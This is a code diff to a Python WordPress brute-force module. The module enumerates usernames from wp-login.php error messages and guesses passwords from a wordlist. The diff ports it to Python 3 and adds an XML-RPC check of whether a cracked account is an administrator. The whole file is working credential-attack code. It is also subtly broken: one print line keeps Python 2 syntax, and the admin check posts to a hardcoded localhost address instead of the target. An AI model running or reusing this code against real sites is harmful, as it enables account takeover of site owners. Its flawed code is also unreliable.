@@ -17,14 +17,14 @@ class Brute_Engine:
 				users_to_brute = usernames.split(',')
 				for user in users_to_brute:
 					user = user.replace(' ', '')
-					print notice("Bruteforcing " + user)
+					print(notice("Bruteforcing " + user))
 					self.bruteforcing_pass(wordpress, user, passwords_list)
 
 			# Bruteforce with usernames list
 			elif users_list:
 				for file_list in [users_list, passwords_list]:
 					if not os.path.isfile(file_list):
-						print critical("Can't found %s file" % file_list)
+						print(critical("Can't found %s file" % file_list))
 						exit()
 				# launch users & passwords bruteforce
 				self.bruteforcing_user(wordpress, users_list, passwords_list)
@@ -34,10 +34,10 @@ class Brute_Engine:
 			else:
 				if len(wordpress.users) != 0:
 					if not os.path.isfile(passwords_list):
-						print critical("Can't found %s file" % passwords_list)
+						print(critical("Can't found %s file" % passwords_list))
 						exit()
 
-					print notice("Bruteforcing detected users: ")
+					print(notice("Bruteforcing detected users: "))
 					for user in wordpress.users:
 						print info("User found "+ user['slug'])
 						self.bruteforcing_pass(wordpress, user['slug'], passwords_list)
@@ -48,7 +48,7 @@ class Brute_Engine:
 	description :
 	"""
 	def bruteforcing_user(self, wordpress, users_list, passwords_list):
-		print notice("Bruteforcing all users")
+		print(notice("Bruteforcing all users"))
 
 		with open(users_list) as data_file:
 			data   = data_file.readlines()
@@ -70,12 +70,12 @@ class Brute_Engine:
 			try:
 				html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
 			except:
-				print critical('ConnectionError in thread, retry...')
+				print(critical('ConnectionError in thread, retry...'))
 				continue
 			break
 		# valid login -> the submited user is printed by WP
 		if '<div id="login_error">' in html and '<strong>%s</strong>' % user in html:
-			print info("User found "+ user)
+			print(info("User found "+ user))
 			users_found.append(user)
 
 
@@ -84,7 +84,7 @@ class Brute_Engine:
 	description :
 	"""
 	def bruteforcing_pass(self, wordpress, user, passwords_list):
-		print info("Starting passwords bruteforce for " + user)
+		print(info("Starting passwords bruteforce for " + user))
 
 		with open(passwords_list) as data_file:
 			data  = data_file.readlines()
@@ -108,9 +108,20 @@ class Brute_Engine:
 			try:
 				html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
 			except:
-				print critical('ConnectionError in thread, retry...')
+				print(critical('ConnectionError in thread, retry...'))
 				continue
 			break
 		if not '<div id="login_error">' in html:
-			print warning("Password found for {} : {}{}".format(user,pwd, ' '*100))
+			print(warning("Password found for {} : {}{}".format(user,pwd, ' '*100)))
 			found[0] = True
+
+			self.xmlrpc_check_admin(user, pwd)
+
+	
+	def xmlrpc_check_admin(self, username, password):
+		post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + username + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
+		req = requests.post("http://127.0.0.1:8000/xmlrpc.php", data=post)
+		regex = re.compile("isAdmin.*boolean.(\d)")
+		match = regex.findall(req.text)
+		if int(match[0]):
+			print(critical("User is an admin !"))
